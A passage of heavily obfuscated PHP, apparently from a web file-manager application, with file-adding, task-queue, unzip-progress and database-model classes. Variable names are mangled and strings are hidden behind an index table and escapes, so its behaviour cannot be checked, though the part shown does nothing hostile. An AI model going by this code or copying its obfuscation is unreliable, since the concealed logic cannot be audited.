$øÃÁÇ•[$úëí»Üí[477]]) { $²ˆàÉÌ[$úëí»Üí[575]][] = $øÃÁÇ•[$úëí»Üí[477]]; } $ƒ…£Â©ç[] = $this->_makeItemData($øÃÁÇ•, $…ºÈµŸı, $øÃÁÇ•[$úëí»Üí[42]]); } unset($øÃÁÇ•); if (!empty($ƒ…£Â©ç)) { $this->addAll($ƒ…£Â©ç); $this->_childrenListSelect($ëñõ âî); } $“©²óĞ = $this->_childrenList($ëñõ âî); $“©²óĞ = array_to_keyvalue($“©²óĞ, $úëí»Üí[42]); foreach ($“Öß©ô… as $øÃÁÇ•) { $óªó¾À‹ = $“©²óĞ[$øÃÁÇ•[$úëí»Üí[42]]]; $È…Ê®‚Ô = $óªó¾À‹[$úëí»Üí[411]]; $this->_copyApplyMeta($óªó¾À‹, $²ˆàÉÌ); if ($øÃÁÇ•[$úëí»Üí[43]] == $úëí»Üí[85]) { $øÃÁÇ•[$úëí»Üí[94]] = $¢—º‚¸Ù->getPathInner($øÃÁÇ•[$úëí»Üí[94]]); $this->_copyChildTo($¢—º‚¸Ù, $øÃÁÇ•[$úëí»Üí[94]], $È…Ê®‚Ô, $À¨¾ªš, $²ˆàÉÌ, $âšƒÚò•); } } } private function _addFiles($ÓÚü¤ò, $ßÆ’…, $Ì–À¸©ª) { $ÕãÂŠëÆ =& $_SERVER[¹Û¹Æ€]; if (!$ßÆ’… || count($ßÆ’…) == 0) { return array(); } $Åü¤“™ã = array(); foreach ($ßÆ’… as &$»şÃğáÉ) { Hook::trigger($ÕãÂŠëÆ[616], $»şÃğáÉ); $»şÃğáÉ[$ÕãÂŠëÆ[94]] = $ÓÚü¤ò->getPathInner($»şÃğáÉ[$ÕãÂŠëÆ[94]]); $ïñ‹ù§ß = $ÓÚü¤ò->hashSimple($»şÃğáÉ[$ÕãÂŠëÆ[94]]); $¡‹ÃÛ´ = $ÓÚü¤ò->hashMd5($»şÃğáÉ[$ÕãÂŠëÆ[94]]); if (strlen($¡‹ÃÛ´) > 10 && !isset($Åü¤“™ã[$¡‹ÃÛ´])) { $Åü¤“™ã[$¡‹ÃÛ´] = array(); } $»şÃğáÉ[$ÕãÂŠëÆ[187]] = $ïñ‹ù§ß; $»şÃğáÉ[$ÕãÂŠëÆ[186]] = $¡‹ÃÛ´; $Åü¤“™ã[$¡‹ÃÛ´][] =& $»şÃğáÉ; if (count($Åü¤“™ã[$¡‹ÃÛ´]) > 1) { $»şÃğáÉ[$ÕãÂŠëÆ[615]] = !0; } Hook::trigger($ÕãÂŠëÆ[617], $»şÃğáÉ); } unset($»şÃğáÉ); $äÖäùº = array($ÕãÂŠëÆ[186] => array($ÕãÂŠëÆ[17], array_keys($Åü¤“™ã))); $Ø”¹ËöÛ = Model($ÕãÂŠëÆ[618]); $ôíõ·½Æ = $Ø”¹ËöÛ->where($äÖäùº)->select(); $ôíõ·½Æ = $ôíõ·½Æ ? $ôíõ·½Æ : array(); foreach ($ôíõ·½Æ as $¨Ìñú×) { if (!isset($Åü¤“™ã[$¨Ìñú×[$ÕãÂŠëÆ[186]]])) { continue; } $¢íĞÛ™ = $Åü¤“™ã[$¨Ìñú×[$ÕãÂŠëÆ[186]]]; foreach ($¢íĞÛ™ as &$»şÃğáÉ) { $»şÃğáÉ[$ÕãÂŠëÆ[477]] = $¨Ìñú×[$ÕãÂŠëÆ[477]]; $»şÃğáÉ[$ÕãÂŠëÆ[615]] = !0; } unset($»şÃğáÉ); } $½òßè² = array(); foreach ($ßÆ’… as $ÌİÊÕÒê) { Hook::trigger($ÕãÂŠëÆ[619], $ÌİÊÕÒê); if (isset($ÌİÊÕÒê[$ÕãÂŠëÆ[615]]) && $ÌİÊÕÒê[$ÕãÂŠëÆ[615]]) { Hook::trigger($ÕãÂŠëÆ[620], $ÌİÊÕÒê); continue; } $İŒùú© = $ÓÚü¤ò->getPathInner($ÌİÊÕÒê[$ÕãÂŠëÆ[94]]); $²Œ®ÆÁÁ = $Ø”¹ËöÛ->addFileMake($İŒùú©, $ÌİÊÕÒê[$ÕãÂŠëÆ[86]], $ÌİÊÕÒê[$ÕãÂŠëÆ[187]], $ÌİÊÕÒê[$ÕãÂŠëÆ[186]], $ÌİÊÕÒê[$ÕãÂŠëÆ[42]], $Ì–À¸©ª); Hook::trigger($ÕãÂŠëÆ[620], $ÌİÊÕÒê); if (!is_array($²Œ®ÆÁÁ)) { continue; } $½òßè²[] = $²Œ®ÆÁÁ; } $Ø”¹ËöÛ->addAll($½òßè²); $äÖäùº = array($ÕãÂŠëÆ[186] => array($ÕãÂŠëÆ[17], array_keys($Åü¤“™ã))); $ôíõ·½Æ = $Ø”¹ËöÛ->where($äÖäùº)->select(); $ôíõ·½Æ = $ôíõ·½Æ ? $ôíõ·½Æ : array(); foreach ($ôíõ·½Æ as $¨Ìñú×) { if (!isset($Åü¤“™ã[$¨Ìñú×[$ÕãÂŠëÆ[186]]])) { continue; } $‹âï¤Ê =& $Åü¤“™ã[$¨Ìñú×[$ÕãÂŠëÆ[186]]]; foreach ($‹âï¤Ê as &$»şÃğáÉ) { $»şÃğáÉ[$ÕãÂŠëÆ[477]] = $¨Ìñú×[$ÕãÂŠëÆ[477]]; } unset($»şÃğáÉ); } $ÜæÓäíÌ = array(); foreach ($ßÆ’… as $Øòâ‘½) { $ÜæÓäíÌ[$Øòâ‘½[$ÕãÂŠëÆ[42]]] = $Øòâ‘½; } return $ÜæÓäíÌ; } } goto C²æ¤­­ñ; bªùî„Á¾Î: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\x75\145\165\145\114\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\141\163\x6b\x51\165\x65\165\x65\x44\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($îÙ­¤»÷, $¬€“‡ÉÙ = array(), $›Š¨ıº = '', $Ò´ÈÂíå = '') { $–—ÖÎ« =& $_SERVER[¹Û¹Æ€]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ò´ÈÂíå && array_find_by_field(self::$listData, $–—ÖÎ«[104], $Ò´ÈÂíå)) { return !0; } self::$listData[] = array($–—ÖÎ«[273] => $îÙ­¤»÷, $–—ÖÎ«[1757] => $¬€“‡ÉÙ, $–—ÖÎ«[462] => $›Š¨ıº, $–—ÖÎ«[104] => $Ò´ÈÂíå); return !0; } public static function addSubmit() { $–µÁº–© =& $_SERVER[¹Û¹Æ€]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($–µÁº–©[1758] . json_encode_force(array_to_keyvalue(self::$listData, $–µÁº–©[22], $–µÁº–©[462])), $–µÁº–©[1759]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($°Éğ‘ï, $›ü²Ï¾‘ = array(), $¢òŞÖµ = '', $œ»íËí‰ = '') { $Àó»ş×ì =& $_SERVER[¹Û¹Æ€]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ã„ğµ = self::getAll(); if ($œ»íËí‰ && array_find_by_field($Ã„ğµ, $Àó»ş×ì[104], $œ»íËí‰)) { return !0; } $Ã„ğµ[] = array($Àó»ş×ì[273] => $°Éğ‘ï, $Àó»ş×ì[1757] => $›ü²Ï¾‘, $Àó»ş×ì[462] => $¢òŞÖµ, $Àó»ş×ì[104] => $œ»íËí‰); write_log($Àó»ş×ì[1758] . $¢òŞÖµ, $Àó»ş×ì[1759]); self::setAll($Ã„ğµ); return !0; } public static function run() { $ıÄàÍ³İ =& $_SERVER[¹Û¹Æ€]; $“ºê†Û¼ = self::getAll(); $Øº—Šì = array_shift($“ºê†Û¼); if (!$Øº—Šì) { return !1; } self::setAll($“ºê†Û¼); $Ë€½àÜ• = timeFloat(); try { Hook::apply($Øº—Šì[$ıÄàÍ³İ[273]], $Øº—Šì[$ıÄàÍ³İ[1757]]); } catch (Exception $”¢ºÍĞÒ) { } $Œ×àÄ† = number_format(timeFloat() - $Ë€½àÜ•, 3) . $ıÄàÍ³İ[1675]; write_log($ıÄàÍ³İ[1760] . $Øº—Šì[$ıÄàÍ³İ[462]] . $ıÄàÍ³İ[1761] . $Œ×àÄ†, $ıÄàÍ³İ[1759]); return !0; } public static function count() { $”°à·’Ô = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$”°à·’Ô) { return 0; } return intval($”°à·’Ô); } public static function getAll() { $æœØµŠ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$æœØµŠ) { return array(); } return $æœØµŠ; } public static function setAll($†’–™ş) { $›‰£¢ùÀ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($†’–™ş), $›‰£¢ùÀ); Cache::set(self::QUEUE_DATA, $†’–™ş, $›‰£¢ùÀ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($´‹†øˆ, $ÒşËüõ‚ = 5.0) { if (!$´‹†øˆ) { return; } $„ÜÖ™ùÂ = Cache::get($´‹†øˆ); if (!$„ÜÖ™ùÂ || timeFloat() - floatVal($„ÜÖ™ùÂ) >= $ÒşËüõ‚) { Cache::set($´‹†øˆ, timeFloat(), $ÒşËüõ‚ * 10); return !0; } return !1; } public static function timeLimitCall($ˆ‰ÓúÔŒ, $¶ßíÏ—Æ, $ÚÔğ¨Òò, $‹ïÔÎáÎ = 5.0) { $ç£ŸĞ€ˆ =& $_SERVER[¹Û¹Æ€]; if (!$ˆ‰ÓúÔŒ || !$¶ßíÏ—Æ) { return; } self::$asyncAdd = !0; $Î•¾ ÷ = $ç£ŸĞ€ˆ[1762]; $õïÆËƒ = Cache::get($Î•¾ ÷, !0); $‚›Ÿ¾àÚ = array($ç£ŸĞ€ˆ[1763] => timeFloat(), $ç£ŸĞ€ˆ[1764] => timeFloat(), $ç£ŸĞ€ˆ[273] => $¶ßíÏ—Æ, $ç£ŸĞ€ˆ[1757] => $ÚÔğ¨Òò, $ç£ŸĞ€ˆ[213] => $‹ïÔÎáÎ); if (is_array($õïÆËƒ[$ˆ‰ÓúÔŒ])) { $‚›Ÿ¾àÚ[$ç£ŸĞ€ˆ[1764]] = $õïÆËƒ[$ˆ‰ÓúÔŒ][$ç£ŸĞ€ˆ[1764]]; } if (is_array($õïÆËƒ[$ˆ‰ÓúÔŒ])) { if (timeFloat() - $õïÆËƒ[$ˆ‰ÓúÔŒ][$ç£ŸĞ€ˆ[1763]] < $‚›Ÿ¾àÚ[$ç£ŸĞ€ˆ[213]] * 0.3) { return; } $‚›Ÿ¾àÚ[$ç£ŸĞ€ˆ[1764]] = $õïÆËƒ[$ˆ‰ÓúÔŒ][$ç£ŸĞ€ˆ[1764]]; } $õïÆËƒ[$ˆ‰ÓúÔŒ] = $‚›Ÿ¾àÚ; Cache::set($Î•¾ ÷, $õïÆËƒ, 60); Cache::removeMemory($Î•¾ ÷); write_log($ç£ŸĞ€ˆ[1765] . $ˆ‰ÓúÔŒ . $ç£ŸĞ€ˆ[81] . $¶ßíÏ—Æ, $ç£ŸĞ€ˆ[1759]); } public static function timeLimitCallLoop() { $ŒÚó¯Õ´ =& $_SERVER[¹Û¹Æ€]; $•¡˜·— = array($ŒÚó¯Õ´[1766]); $¡®ÓõÏÍ = in_array(strtolower(ACTION), $•¡˜·—); if (!$¡®ÓõÏÍ && !self::$asyncAdd) { return; } $¨÷÷Ü÷× = $ŒÚó¯Õ´[1762]; $¨ØæˆõÉ = Cache::get($¨÷÷Ü÷×, !0); if (!$¨ØæˆõÉ || count($¨ØæˆõÉ) <= 0) { return; } $äêÏ™€Â = !1; $ø›ŸŒ§ = timeFloat(); $¶¦¾£— = array(); foreach ($¨ØæˆõÉ as $†œÎğ­¾ => $àô°¾¨²) { if ($ø›ŸŒ§ - $àô°¾¨²[$ŒÚó¯Õ´[1764]] > $àô°¾¨²[$ŒÚó¯Õ´[213]]) { $äêÏ™€Â = !0; try { Hook::apply($àô°¾¨²[$ŒÚó¯Õ´[273]], $àô°¾¨²[$ŒÚó¯Õ´[1757]]); write_log($ŒÚó¯Õ´[1767] . $†œÎğ­¾ . $ŒÚó¯Õ´[81] . $àô°¾¨²[$ŒÚó¯Õ´[273]] . $ŒÚó¯Õ´[1768] . ACTION, $ŒÚó¯Õ´[1759]); } catch (Exception $Ğ¹ÚÔ‘ˆ) { } continue; } $¶¦¾£—[$†œÎğ­¾] = $àô°¾¨²; } if (!$äêÏ™€Â) { return; } if (!$¶¦¾£—) { return Cache::remove($¨÷÷Ü÷×); } Cache::set($¨÷÷Ü÷×, $¶¦¾£—, 60); Cache::removeMemory($¨÷÷Ü÷×); } public static function finished($Ş’³¬ı–, $İÉíİîÒ) { $ìŸ¶àşÖ =& $_SERVER[¹Û¹Æ€]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ìŸ¶àşÖ[273] => $Ş’³¬ı–, $ìŸ¶àşÖ[1757] => $İÉíİîÒ); } private static function finishedRun() { $şÍ›®µõ =& $_SERVER[¹Û¹Æ€]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $§¥ËÙ±í) { try { Hook::apply($§¥ËÙ±í[$şÍ›®µõ[273]], $§¥ËÙ±í[$şÍ›®µõ[1757]]); } catch (Exception $éş¯±×Ù) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $İ–¥¼¤Ü =& $_SERVER[¹Û¹Æ€]; parent::startAfter(); Hook::bind($İ–¥¼¤Ü[1769], array($this, $İ–¥¼¤Ü[1770])); Hook::bind($İ–¥¼¤Ü[1191], array($this, $İ–¥¼¤Ü[1771])); $ÇâÀ’§ñ =& $this->task; $ÇâÀ’§ñ[$İ–¥¼¤Ü[1772]] = $İ–¥¼¤Ü[1192]; if (!$ÇâÀ’§ñ[$İ–¥¼¤Ü[1559]]) { $ÇâÀ’§ñ[$İ–¥¼¤Ü[1559]] = LNG($İ–¥¼¤Ü[1773]); } } protected function endAfter() { $ÎïŸÒ«Ê =& $_SERVER[¹Û¹Æ€]; parent::endAfter(); Hook::unbind($ÎïŸÒ«Ê[1769], array($this, $ÎïŸÒ«Ê[1770])); Hook::unbind($ÎïŸÒ«Ê[1191], array($this, $ÎïŸÒ«Ê[1771])); } public function updateAfter() { $Î÷Ÿ‰üì =& $_SERVER[¹Û¹Æ€]; $İúâòÇ“ =& $this->task; if (!$İúâòÇ“[$Î÷Ÿ‰üì[784]] || !$İúâòÇ“[$Î÷Ÿ‰üì[761]]) { return; } if ($İúâòÇ“[$Î÷Ÿ‰üì[1772]] == $Î÷Ÿ‰üì[1192]) { $ı¿Í“– = 0; if ($İúâòÇ“[$Î÷Ÿ‰üì[1712]]) { $ı¿Í“– = $İúâòÇ“[$Î÷Ÿ‰üì[1713]] / $İúâòÇ“[$Î÷Ÿ‰üì[1712]]; } $İúâòÇ“[$Î÷Ÿ‰üì[1661]] = $ı¿Í“– * 0.3; } else { if ($İúâòÇ“[$Î÷Ÿ‰üì[1772]] == $Î÷Ÿ‰üì[322]) { $ı¿Í“– = $İúâòÇ“[$Î÷Ÿ‰üì[1660]] / $İúâòÇ“[$Î÷Ÿ‰üì[784]]; $İúâòÇ“[$Î÷Ÿ‰üì[1661]] = 0.3 + $ı¿Í“– * 0.4; } else { if ($İúâòÇ“[$Î÷Ÿ‰üì[1772]] == $Î÷Ÿ‰üì[117]) { $í•Êö˜á = 0; if ($İúâòÇ“[$Î÷Ÿ‰üì[1714]] == $Î÷Ÿ‰üì[117]) { $í•Êö˜á = $İúâòÇ“[$Î÷Ÿ‰üì[1713]]; } $ı¿Í“– = ($İúâòÇ“[$Î÷Ÿ‰üì[1717]] + $í•Êö˜á) / $İúâòÇ“[$Î÷Ÿ‰üì[761]]; $İúâòÇ“[$Î÷Ÿ‰üì[1661]] = 0.3 + 0.4 + $ı¿Í“– * 0.3; } } } if ($İúâòÇ“[$Î÷Ÿ‰üì[1661]] > 0) { $îª·¹Ú¿ = timeFloat() - $İúâòÇ“[$Î÷Ÿ‰üì[1663]] - $İúâòÇ“[$Î÷Ÿ‰üì[1666]]; $İúâòÇ“[$Î÷Ÿ‰üì[1667]] = $îª·¹Ú¿ * (1 - $İúâòÇ“[$Î÷Ÿ‰üì[1661]]) / $İúâòÇ“[$Î÷Ÿ‰üì[1661]]; } } public function addFile($›”„ªîÖ) { $ş‹ôïÀ =& $_SERVER[¹Û¹Æ€]; $å‰ïˆÜó =& $this->task; $Ş‹’ÁÀ¡ = IO::info($›”„ªîÖ); $å‰ïˆÜó[$ş‹ôïÀ[1710]] = $Ş‹’ÁÀ¡[$ş‹ôïÀ[42]]; $å‰ïˆÜó[$ş‹ôïÀ[1712]] = $Ş‹’ÁÀ¡[$ş‹ôïÀ[86]]; $å‰ïˆÜó[$ş‹ôïÀ[1713]] = 0; $å‰ïˆÜó[$ş‹ôïÀ[1061]] = $ş‹ôïÀ[1733]; $å‰ïˆÜó[$ş‹ôïÀ[1714]] = $ş‹ôïÀ[1192]; $å‰ïˆÜó[$ş‹ôïÀ[761]] = $Ş‹’ÁÀ¡[$ş‹ôïÀ[86]]; $å‰ïˆÜó[$ş‹ôïÀ[784]] = 1; $‚Ö«‰Ô = 0; $å‰ïˆÜó[$ş‹ôïÀ[1721]] = array($ş‹ôïÀ[1722] => $‚Ö«‰Ô + 1, $ş‹ôïÀ[429] => $Ş‹’ÁÀ¡[$ş‹ôïÀ[42]], $ş‹ôïÀ[94] => $Ş‹’ÁÀ¡[$ş‹ôïÀ[94]], $ş‹ôïÀ[528] => $Ş‹’ÁÀ¡[$ş‹ôïÀ[528]] ? $Ş‹’ÁÀ¡[$ş‹ôïÀ[528]] : $Ş‹’ÁÀ¡[$ş‹ôïÀ[94]]); $this->update(); } public function unzipAfter($ßáÖ§úˆ) { $Æ¬»å¥Ò =& $_SERVER[¹Û¹Æ€]; $ñÜÈƒòš =& $this->task; $ñÜÈƒòš[$Æ¬»å¥Ò[1772]] = $Æ¬»å¥Ò[117]; $ï¶¹Ï = IO::infoWithChildren($ßáÖ§úˆ); $ô€ö™· = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[1721]] = array($Æ¬»å¥Ò[1722] => $ô€ö™· + 1, $Æ¬»å¥Ò[429] => $ï¶¹Ï[$Æ¬»å¥Ò[42]], $Æ¬»å¥Ò[94] => $ï¶¹Ï[$Æ¬»å¥Ò[94]], $Æ¬»å¥Ò[528] => $ï¶¹Ï[$Æ¬»å¥Ò[528]] ? $ï¶¹Ï[$Æ¬»å¥Ò[528]] : $ï¶¹Ï[$Æ¬»å¥Ò[94]]); if ($ï¶¹Ï[$Æ¬»å¥Ò[43]] == $Æ¬»å¥Ò[209]) { $ñÜÈƒòš[$Æ¬»å¥Ò[784]] = 1; } else { $ñÜÈƒòš[$Æ¬»å¥Ò[784]] = $ï¶¹Ï[$Æ¬»å¥Ò[89]][$Æ¬»å¥Ò[87]]; } $ñÜÈƒòš[$Æ¬»å¥Ò[1061]] = $Æ¬»å¥Ò[22]; $ñÜÈƒòš[$Æ¬»å¥Ò[1714]] = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[1660]] = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[1712]] = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[1713]] = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[1710]] = $Æ¬»å¥Ò[22]; $ñÜÈƒòš[$Æ¬»å¥Ò[1717]] = 0; $ñÜÈƒòš[$Æ¬»å¥Ò[761]] = $ï¶¹Ï[$Æ¬»å¥Ò[86]]; $this->update(); self::log($Æ¬»å¥Ò[1774] . json_encode(array($ñÜÈƒòš, $ï¶¹Ï))); } public function nameParse($×™—Ò´à) { $¿Ö’Äå =& $_SERVER[¹Û¹Æ€]; $‚ı¬ÛäØ =& $this->task; if ($‚ı¬ÛäØ[$¿Ö’Äå[1772]] == $¿Ö’Äå[1192]) { $‚ı¬ÛäØ[$¿Ö’Äå[1772]] = $¿Ö’Äå[322]; $‚ı¬ÛäØ[$¿Ö’Äå[1717]] = 0; $‚ı¬ÛäØ[$¿Ö’Äå[761]] = 0; } $™Ë‹Â†ƒ = get_path_this($×™—Ò´à); if (strstr($™Ë‹Â†ƒ, $¿Ö’Äå[20])) { $‚ı¬ÛäØ[$¿Ö’Äå[1660]] += 1; $‚ı¬ÛäØ[$¿Ö’Äå[784]] += 1; } $‚ı¬ÛäØ[$¿Ö’Äå[1710]] = $×™—Ò´à; $this->update(); } } goto bË«áøËì; A«ãßÍì‡: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\157\x72\x64\x65\162", "\141\x6c\151\x61\163", "\150\141\x76\151\156\147", "\x67\x72\157\165\160", "\x6c\x6f\x63\x6b", "\144\x69\x73\x74\x69\156\143\x74", "\141\165\164\157", "\x66\x69\154\164\x65\162", "\x76\x61\154\x69\144\x61\164\145", "\x72\x65\163\165\x6c\x74", "\142\x69\x6e\144", "\x74\x6f\x6b\145\156"); public function __construct($²‰Ğ–ğ³ = '', $Ã«ŸßØ = '', $ë·è = '') { $âÒÂÍìÄ =& $_SERVER[¹Û¹Æ€]; $this->_initialize(); if (!empty($²‰Ğ–ğ³)) { if (strpos($²‰Ğ–ğ³, $âÒÂÍìÄ[20])) { list($this->dbName, $this->name) = explode($âÒÂÍìÄ[20], $²‰Ğ–ğ³); } else { $this->name = $²‰Ğ–ğ³; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ã«ŸßØ)) { $this->tablePrefix = $âÒÂÍìÄ[22]; } elseif ($âÒÂÍìÄ[22] != $Ã«ŸßØ) { $this->tablePrefix = $Ã«ŸßØ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($âÒÂÍìÄ[253]); } $this->db(0, empty($this->connection) ? $ë·è : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ü‹ÂÃâ =& $_SERVER[¹Û¹Æ€]; if (empty($this->fields)) { if (think_config($Ü‹ÂÃâ[254])) { $¤ãşÁŞ’ = $this->dbName ? $this->dbName : think_config($Ü‹ÂÃâ[255]); $û±‹ëø™ = think_var_cache($Ü‹ÂÃâ[256] . strtolower(get_path_this($¤ãşÁŞ’) . $Ü‹ÂÃâ[20] . $this->name)); if ($û±‹ëø™) { $øè¹øúº = think_config($Ü‹ÂÃâ[257]); if (empty($øè¹øúº) || $û±‹ëø™[$Ü‹ÂÃâ[258]] == $øè¹øúº) { $this->fields = $û±‹ëø™; return; } } } $this->flush(); } } public function flush() { $§ğÊÀÊ =& $_SERVER[¹Û¹Æ€]; $this->db->setModel($this->name); $ê³¶ˆÌ = $this->db->getFields($this->getTableName()); if (!$ê³¶ˆÌ) { return !1; } $this->fields = array_keys($ê³¶ˆÌ); $this->fields[$§ğÊÀÊ[259]] = !1; foreach ($ê³¶ˆÌ as $œ°ö©õ± => $Õ”°ú¥š) { $­ûÊúà­[$œ°ö©õ±] = $Õ”°ú¥š[$§ğÊÀÊ[43]]; if ($Õ”°ú¥š[$§ğÊÀÊ[49]]) { $this->fields[$§ğÊÀÊ[260]] = $œ°ö©õ±; if ($Õ”°ú¥š[$§ğÊÀÊ[52]]) { $this->fields[$§ğÊÀÊ[259]] = !0; } } } $this->fields[$§ğÊÀÊ[261]] = $­ûÊúà­; if (think_config($§ğÊÀÊ[257])) { $this->fields[$§ğÊÀÊ[258]] = think_config($§ğÊÀÊ[257]); } if (think_config($§ğÊÀÊ[254])) { $ ëòÓôõ = $this->dbName ? $this->dbName : think_config($§ğÊÀÊ[255]); think_var_cache($§ğÊÀÊ[256] . strtolower(get_path_this($ ëòÓôõ) . $§ğÊÀÊ[20] . $this->name), $this->fields); } } public function switchModel($òÛ¼ü…¬, $·º´•€Ê = array()) { $âÍ¦»…œ =& $_SERVER[¹Û¹Æ€]; $ŒÌ§ÇÏ = ucwords(strtolower($òÛ¼ü…¬)) . $âÍ¦»…œ[262]; if (!class_exists($ŒÌ§ÇÏ)) { think_exception($ŒÌ§ÇÏ . think_lang($âÍ¦»…œ[263])); } $this->_extModel = new $ŒÌ§ÇÏ($this->name); if (!empty($·º´•€Ê)) { foreach ($·º´•€Ê as $Ë”çğ·) { $this->_extModel->setProperty($Ë”çğ·, $this->{$Ë”çğ·}); } } return $this->_extModel; } public function __set($µÇç‚³º, $Şş—õ¹õ) { $this->data[$µÇç‚³º] = $Şş—õ¹õ; } public function __get($¯Øù™ı) { return isset($this->data[$¯Øù™ı]) ? $this->data[$¯Øù™ı] : null; } public function __isset($İáÄò¤¸) { return isset($this->data[$İáÄò¤¸]); } public function __unset($ˆöšÏ’µ) { unset($this->data[$ˆöšÏ’µ]); } public function __call($Ÿ£ã«ï³, $è¨ÜÎ›ú) { $í¯¤ã¢” =& $_SERVER[¹Û¹Æ€]; if (in_array(strtolower($Ÿ£ã«ï³), $this->methods, !0)) { $this->options[strtolower($Ÿ£ã«ï³)] = $è¨ÜÎ›ú[0]; return $this; } elseif (in_array(strtolower($Ÿ£ã«ï³), array($í¯¤ã¢”[264], $í¯¤ã¢”[265], $í¯¤ã¢”[266], $í¯¤ã¢”[267], $í¯¤ã¢”[268]), !0)) { $ï»¼‹ä = isset($è¨ÜÎ›ú[0]) ? $è¨ÜÎ›ú[0] : $í¯¤ã¢”[198]; $ï»¼‹ä = $this->db->parseKey($ï»¼‹ä); return $this->getField(strtoupper($Ÿ£ã«ï³) . $í¯¤ã¢”[269] . $ï»¼‹ä . $í¯¤ã¢”[270] . $Ÿ£ã«ï³, $í¯¤ã¢”[264]); } elseif (strtolower(substr($Ÿ£ã«ï³, 0, 5)) == $í¯¤ã¢”[271]) { $ï»¼‹ä = think_parse_name(substr($Ÿ£ã«ï³, 5)); $…æû™Ñé[$ï»¼‹ä] = $è¨ÜÎ›ú[0]; return $this->where($…æû™Ñé)->find(); } elseif (strtolower(substr($Ÿ£ã«ï³, 0, 10)) == $í¯¤ã¢”[272]) { $şİ¿Ïˆ¯ = think_parse_name(substr($Ÿ£ã«ï³, 10)); $…æû™Ñé[$şİ¿Ïˆ¯] = $è¨ÜÎ›ú[0]; return $this->where($…æû™Ñé)->getField($è¨ÜÎ›ú[1]); } elseif (isset($this->_scope[$Ÿ£ã«ï³])) { return $this->scope($Ÿ£ã«ï³, $è¨ÜÎ›ú[0]); } elseif (method_exists($this, $Ÿ£ã«ï³)) { array_unshift($è¨ÜÎ›ú, $Ÿ£ã«ï³); return call_user_func_array(array($this, $í¯¤ã¢”[273]), $è¨ÜÎ›ú); } else { return call_user_func_array(array(parent, $Ÿ£ã«ï³), $è¨ÜÎ›ú); } } protected function call() { $€©§§¾î =& $_SERVER[¹Û¹Æ€]; $áº£·í = func_get_args(); $ğ‚ï» = array_shift($áº£·í); $‹“ìÅúÆ = $ğ‚ï»; if (is_array($ğ‚ï»)) { $‹“ìÅúÆ = $ğ‚ï»[1]; $ğ‚ï» = $ğ‚ï»[0]; } $æÔĞÌí› = count($áº£·í) - 1; if (isset($áº£·í[$æÔĞÌí›]) && $áº£·í[$æÔĞÌí›] === $ğ‚ï») { think_exception(__CLASS__ . $€©§§¾î[4] . $ğ‚ï» . think_lang($€©§§¾î[274])); return; } $áº£·í[] = $ğ‚ï»; if (method_exists($this, $€©§§¾î[275])) { $ÑØ¼ƒİ = call_user_func_array(array($this, $€©§§¾î[276]), array($‹“ìÅúÆ, $áº£·í)); if (!is_null($ÑØ¼ƒİ) && $ÑØ¼ƒİ !== !1) { return $ÑØ¼ƒİ; } } $Ššáù¬Û = call_user_func_array(array($this, $ğ‚ï»), $áº£·í); if (method_exists($this, $€©§§¾î[277])) { $ÑØ¼ƒİ = call_user_func_array(array($this, $€©§§¾î[278]), array($‹“ìÅúÆ, $áº£·í, $Ššáù¬Û)); if ($ÑØ¼ƒİ) { return $ÑØ¼ƒİ; } } return $Ššáù¬Û; } protected function _initialize() { } protected function _facade($Ó¹üƒá) { $¼·æˆ¸ƒ =& $_SERVER[¹Û¹Æ€]; if (!empty($this->fields)) { foreach ($Ó¹üƒá as $øÃË·Ùµ => $ÅÂ•îÔ¹) { if (is_array($this->fields) && !in_array($øÃË·Ùµ, $this->fields, !0)) { unset($Ó¹üƒá[$øÃË·Ùµ]); } elseif (is_scalar($ÅÂ•îÔ¹)) { $this->_parseType($Ó¹üƒá, $øÃË·Ùµ); } } } if (!empty($this->options[$¼·æˆ¸ƒ[279]])) { $Ó¹üƒá = array_map($this->options[$¼·æˆ¸ƒ[279]], $Ó¹üƒá); unset($this->options[$¼·æˆ¸ƒ[279]]); } $this->_beforeWrite($Ó¹üƒá); return $Ó¹üƒá; } protected function _beforeWrite(&$××­¸ùà) { } public function add($ˆÈ›£ = '', $ÛÄ„¹ = array(), $‹¸Èğ¹­ = false) { if (empty($ˆÈ›£)) { if (!empty($this->data)) { $ˆÈ›£ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹Û¹Æ€][280]); return !1; } } $ÛÄ„¹ = $this->_parseOptions($ÛÄ„¹); $ˆÈ›£ = $this->_facade($ˆÈ›£); if (!1 === $this->_beforeInsert($ˆÈ›£, $ÛÄ„¹)) { return !1; } $®ºÃœÄ = 